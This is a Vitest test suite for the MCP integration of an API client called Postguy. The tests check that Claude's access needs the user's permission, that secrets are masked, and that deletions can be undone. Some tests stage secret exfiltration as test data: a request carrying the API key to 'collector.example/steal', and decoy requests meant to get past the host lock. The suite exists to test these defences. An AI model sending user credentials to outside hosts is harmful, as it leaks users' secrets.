import { spawn } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { createHarness, TOKEN, type Harness } from './harness.ts';

const BRIDGE = join(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'postguy-mcp.mjs');
const SECRET = 'tok-secret-xyz-123';

let h: Harness;
let url: string;
let client: Client;
let ids: { collection: string; echo: string; env: string };

async function connect() {
  const c = new Client({ name: 'test', version: '1' });
  await c.connect(new StreamableHTTPClientTransport(new URL(`${url}/mcp`), { requestInit: { headers: { Authorization: `Bearer ${TOKEN}` } } }));
  return c;
}

async function tool(name: string, args: Record<string, unknown> = {}) {
  const res = (await client.callTool({ name, arguments: args })) as { isError?: boolean; content: { text: string }[] };
  const text = res.content[0]!.text;
  let value: any = text;
  try {
    value = JSON.parse(text);
  } catch {
    /* an error message */
  }
  return { error: res.isError ? text : null, value };
}

const allow = (patch: Record<string, boolean>) => h.call('PATCH', '/settings/mcp', patch);

beforeEach(async () => {
  h = await createHarness();
  await h.app.listen({ port: 0, host: '127.0.0.1' });
  const addr = h.app.server.address();
  url = `http://127.0.0.1:${typeof addr === 'object' && addr ? addr.port : 0}`;
  const col = (await h.call('POST', '/collections', { name: 'Shop', parentId: null })).body;
  await h.call('PUT', `/variables/collection/${col.id}/baseUrl`, { value: h.mockUrl });
  const echo = (
    await h.call('POST', '/requests', {
      collectionId: col.id,
      name: 'Echo',
      method: 'GET',
      url: '{{baseUrl}}/echo',
      headers: [{ id: 'h1', key: 'X-Api-Key', value: '{{apiKey}}', enabled: true }],
    })
  ).body;
  const env = (await h.call('POST', '/environments', { name: 'Local' })).body;
  await h.call('PUT', `/variables/environment/${env.id}`, { variables: [{ key: 'apiKey', value: SECRET, isSecret: true }] });
  await h.call('POST', `/environments/${env.id}/activate`, {});
  ids = { collection: col.id, echo: echo.id, env: env.id };
  client = await connect();
});

afterEach(async () => {
  await client.close();
  await h.close();
});

describe('Claude (MCP) access', () => {
  it('lists its tools but refuses to act until the user turns it on', async () => {
    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name)).toEqual(expect.arrayContaining(['list_requests', 'send_request', 'get_variables', 'decode_jwt', 'create_request', 'run_flow']));
    expect((await tool('list_requests')).error).toMatch(/turned off in Postguy/);
    expect((await h.call('GET', '/settings/mcp')).body).toEqual({ enabled: false, read: true, send: false, edit: false, delete: false });
  });

  it('gives a Claude Code setup command that runs the bridge', async () => {
    const setup = (await h.call('GET', '/settings/mcp/setup')).body;
    expect(setup.command).toBe('node');
    expect(setup.args[0]).toBe(BRIDGE);
    expect(setup.claudeCode).toBe(`claude mcp add postguy -- node ${BRIDGE}`);
  });

  it('reads with secrets masked, and only sends or edits when allowed', async () => {
    await allow({ enabled: true });
    expect((await tool('list_requests', { query: 'echo' })).value).toEqual([
      { id: ids.echo, name: 'Echo', method: 'GET', url: '{{baseUrl}}/echo', collectionId: ids.collection, folder: 'Shop' },
    ]);
    const vars = (await tool('get_variables', { requestId: ids.echo })).value;
    expect(vars.environment).toBe('Local');
    expect(vars.variables.find((v: any) => v.key === 'apiKey')).toMatchObject({ source: 'environment', secret: true, value: '••••••' });
    expect((await tool('send_request', { requestId: ids.echo })).error).toMatch(/does not allow Claude to send requests/);
    expect((await tool('create_request', { collectionId: ids.collection, name: 'New', url: '/x' })).error).toMatch(/does not allow Claude to change the workspace/);
  });

  it('sends with the secret filled in, masks it in the response and labels the history entry', async () => {
    await allow({ enabled: true, send: true });
    const { value } = await tool('send_request', { requestId: ids.echo });
    expect(value.status).toBe(200);
    expect(JSON.stringify(value)).not.toContain(SECRET);
    expect(value.body).toContain('"x-api-key":"••••••"');
    const [entry] = (await h.call('GET', '/history')).body;
    expect(entry.source).toBe('mcp');
  });

  it('refuses to send a secret to a host the user never sends to', async () => {
    await allow({ enabled: true, send: true });
    const before = (await h.call('GET', '/history')).body.length;
    const res = await tool('send_request', { url: 'https://collector.example/steal', headers: { 'X-Key': '{{apiKey}}' } });
    expect(res.value.error.code).toBe('MCP_SECRET_HOST_BLOCKED');
    expect(res.value.error.message).toMatch(/collector\.example/);
    expect((await h.call('GET', '/history')).body.length).toBe(before);
    const ok = await tool('send_request', { url: `${h.mockUrl}/echo`, headers: { 'X-Key': '{{apiKey}}' } });
    expect(ok.value.status).toBe(200);
  });

  it('keeps blocked environments away from Claude and reveals secrets only where allowed', async () => {
    await allow({ enabled: true, send: true });
    await h.call('PATCH', `/environments/${ids.env}`, { mcpBlocked: true });
    expect((await tool('send_request', { requestId: ids.echo })).error).toMatch(/"Local" is not available to Claude/);
    expect((await tool('get_variables', { requestId: ids.echo })).error).toMatch(/not available to Claude/);
    await h.call('PATCH', `/environments/${ids.env}`, { mcpBlocked: false, mcpRevealSecrets: true });
    const vars = (await tool('get_variables', { requestId: ids.echo })).value;
    expect(vars.variables.find((v: any) => v.key === 'apiKey').value).toBe(SECRET);
  });

  it('decodes a JWT without returning the token or signature', async () => {
    await allow({ enabled: true });
    const part = (o: object) => Buffer.from(JSON.stringify(o)).toString('base64url');
    const jwt = `${part({ alg: 'HS256', typ: 'JWT' })}.${part({ sub: 'u1', scope: 'read', exp: 2_000_000_000 })}.c2lnbmF0dXJlLXNlY3JldA`;
    await h.call('PUT', `/variables/environment/${ids.env}/jwt`, { value: jwt, isSecret: true });
    const { value } = await tool('decode_jwt', { variable: 'jwt' });
    expect(value).toMatchObject({ header: { alg: 'HS256' }, claims: { sub: 'u1', scope: 'read' }, expired: false, expiresAt: '2033-05-18T03:33:20.000Z' });
    expect(JSON.stringify(value)).not.toContain('c2lnbmF0dXJlLXNlY3JldA');
    expect(JSON.stringify(value)).not.toContain(jwt);
  });

  it('edits the workspace when allowed, never echoing secret values', async () => {
    await allow({ enabled: true, edit: true });
    const created = (await tool('create_request', { collectionId: ids.collection, name: 'Health', url: '{{baseUrl}}/health', headers: { Accept: 'application/json' } })).value;
    expect(created).toMatchObject({ name: 'Health', method: 'GET', url: '{{baseUrl}}/health' });
    const set = (await tool('set_variable', { scope: 'environment', key: 'other', value: 'shh', secret: true })).value;
    expect(set).toEqual({ key: 'other', scope: 'environment', secret: true, value: '••••••' });
    expect((await tool('set_active_environment', { environment: null })).value).toEqual({ active: null });
  });

  it('runs a flow and returns its report', async () => {
    await allow({ enabled: true, send: true });
    const flow = (await h.call('POST', '/flows', { name: 'Check', collectionId: ids.collection })).body;
    await h.call('PUT', `/flows/${flow.id}/graph`, { steps: [{ id: 's1', name: 'Echo', kind: 'request', requestId: ids.echo }], connections: [] });
    const { value } = await tool('run_flow', { flowId: flow.id });
    expect(value.status).toBe('success');
    expect(JSON.stringify(value)).not.toContain(SECRET);
    expect((await h.call('GET', '/history')).body[0].source).toBe('mcp');
  });
});

describe('postguy-mcp bridge', () => {
  const run = (dataDir: string, lines: object[]) =>
    new Promise<any[]>((resolve, reject) => {
      const child = spawn(process.execPath, [BRIDGE, '--data-dir', dataDir]);
      const out: any[] = [];
      let buf = '';
      child.stdout.on('data', (d) => {
        buf += d;
        let i;
        while ((i = buf.indexOf('\n')) >= 0) {
          out.push(JSON.parse(buf.slice(0, i)));
          buf = buf.slice(i + 1);
          if (out.length === lines.filter((l: any) => l.id !== undefined).length) {
            child.kill();
            resolve(out);
          }
        }
      });
      child.on('error', reject);
      for (const l of lines) child.stdin.write(`${JSON.stringify(l)}\n`);
      setTimeout(() => {
        child.kill();
        resolve(out);
      }, 8000);
    });

  it('relays stdio JSON-RPC to the running app found through server.json', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'postguy-mcp-'));
    writeFileSync(join(dir, 'server.json'), JSON.stringify({ url, token: TOKEN, pid: process.pid }));
    const out = await run(dir, [
      { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } },
      { jsonrpc: '2.0', method: 'notifications/initialized' },
      { jsonrpc: '2.0', id: 2, method: 'tools/list' },
    ]);
    rmSync(dir, { recursive: true, force: true });
    expect(out[0]).toMatchObject({ id: 1, result: { serverInfo: { name: 'postguy' } } });
    expect(out[1].id).toBe(2);
    expect(out[1].result.tools.map((t: any) => t.name)).toContain('send_request');
  });

  it("answers with a clear error when Postguy isn't running", async () => {
    const dir = mkdtempSync(join(tmpdir(), 'postguy-mcp-'));
    const out = await run(dir, [{ jsonrpc: '2.0', id: 7, method: 'tools/list' }]);
    rmSync(dir, { recursive: true, force: true });
    expect(out).toEqual([{ jsonrpc: '2.0', id: 7, error: { code: -32000, message: "Postguy isn't running. Open Postguy and try again." } }]);
  });
});

describe('Claude (MCP) secret handling', () => {
  const other = () => h.mockUrl.replace('127.0.0.1', 'localhost');

  it("can't open the host lock by saving a request or variable that points elsewhere", async () => {
    await allow({ enabled: true, read: true, send: true, edit: true });
    const steal = { requestId: ids.echo, url: `${other()}/echo` };
    expect((await tool('send_request', steal)).value.error.code).toBe('MCP_SECRET_HOST_BLOCKED');
    await tool('set_variable', { scope: 'collection', owner: ids.collection, key: 'mirror', value: other() });
    await tool('create_request', { collectionId: ids.collection, name: 'Decoy', url: `${other()}/x` });
    expect((await tool('send_request', steal)).value.error.code).toBe('MCP_SECRET_HOST_BLOCKED');

    // Once the user sends there themselves, it is their host again.
    const decoy = (await h.call('GET', '/collections/tree')).body[0].requests.find((r: any) => r.name === 'Decoy');
    await h.call('POST', '/send', { requestId: decoy.id, collectionId: ids.collection, request: (await h.call('GET', `/requests/${decoy.id}`)).body });
    expect((await tool('send_request', steal)).value.status).toBe(200);
  });

  it('masks request secrets, literal credentials and secrets in history bodies', async () => {
    await allow({ enabled: true, read: true, send: true });
    await h.call('PUT', `/variables/request/${ids.echo}`, { variables: [{ key: 'reqSecret', value: 'REQSECRET-xyz', isSecret: true }] });
    await h.call('PATCH', `/requests/${ids.echo}`, {
      headers: [{ id: 'h1', key: 'X-Req', value: '{{reqSecret}}', enabled: true }],
      auth: { type: 'bearer', token: 'LITERAL-TOKEN-999' },
    });
    const vars = (await tool('get_variables', { requestId: ids.echo })).value.variables;
    expect(vars.find((v: any) => v.key === 'reqSecret').value).toBe('••••••');
    const req = (await tool('get_request', { id: ids.echo })).value;
    expect(JSON.stringify(req)).not.toContain('LITERAL-TOKEN-999');
    const sent = await tool('send_request', { requestId: ids.echo });
    expect(sent.error).toBeNull();
    expect(JSON.stringify(sent.value)).not.toMatch(/REQSECRET-xyz|LITERAL-TOKEN-999/);
    const entry = await tool('get_history_entry', { id: sent.value.historyId });
    expect(JSON.stringify(entry.value)).not.toMatch(/REQSECRET-xyz|LITERAL-TOKEN-999/);
  });

  it('keeps working when a secret looks like a number or true', async () => {
    await allow({ enabled: true, read: true, send: true });
    await h.call('PUT', `/variables/collection/${ids.collection}/pin`, { value: '200', isSecret: true });
    await h.call('PUT', `/variables/collection/${ids.collection}/flag`, { value: 'true', isSecret: true });
    const sent = await tool('send_request', { requestId: ids.echo });
    expect(sent.error).toBeNull();
    expect(sent.value.status).toBe(200);
    expect((await tool('get_request', { id: ids.echo })).error).toBeNull();
  });
});

describe('Claude (MCP) deleting', () => {
  it('needs its own permission, and every deletion can be undone', async () => {
    await allow({ enabled: true, read: true, edit: true });
    expect((await tool('delete_request', { id: ids.echo })).error).toMatch(/does not allow Claude to delete/);
    await allow({ delete: true, edit: false });
    expect((await tool('delete_request', { id: ids.echo })).error).toMatch(/does not allow Claude to delete/);
    await allow({ edit: true });

    const done = (await tool('delete_request', { id: ids.echo })).value;
    expect(done).toMatchObject({ deleted: 'Echo', changeId: expect.any(String) });
    expect((await h.call('GET', `/requests/${ids.echo}`)).status).toBe(404);
    const [change] = (await h.call('GET', `/collections/${ids.collection}/changes`)).body;
    expect(change).toMatchObject({ action: 'delete', source: 'mcp', id: done.changeId });

    expect((await tool('restore_change', { changeId: done.changeId })).value.message).toMatch(/Brought back/);
    expect((await h.call('GET', `/requests/${ids.echo}`)).body.name).toBe('Echo');
  });

  it('deletes a folder or collection, but not one holding more than 50 requests', async () => {
    await allow({ enabled: true, read: true, edit: true, delete: true });
    const big = (await h.call('POST', '/collections', { name: 'Big', parentId: ids.collection })).body;
    for (let i = 0; i < 51; i++) await h.call('POST', '/requests', { collectionId: big.id, name: `R${i}`, method: 'GET', url: 'http://x' });
    expect((await tool('delete_folder', { id: big.id })).error).toMatch(/holds 51 requests/);
    expect((await tool('delete_folder', { id: ids.collection })).error).toMatch(/holds 52 requests/);
    await h.call('DELETE', `/requests/${(await h.call('GET', '/collections/tree')).body[0].children[0].requests[0].id}`);
    const done = (await tool('delete_folder', { id: big.id })).value;
    expect(done).toMatchObject({ deleted: 'Big', kind: 'folder', requests: 50 });
    await tool('restore_change', { changeId: done.changeId });
    expect((await h.call('GET', '/collections/tree')).body[0].children[0].requests).toHaveLength(50);
  });
});
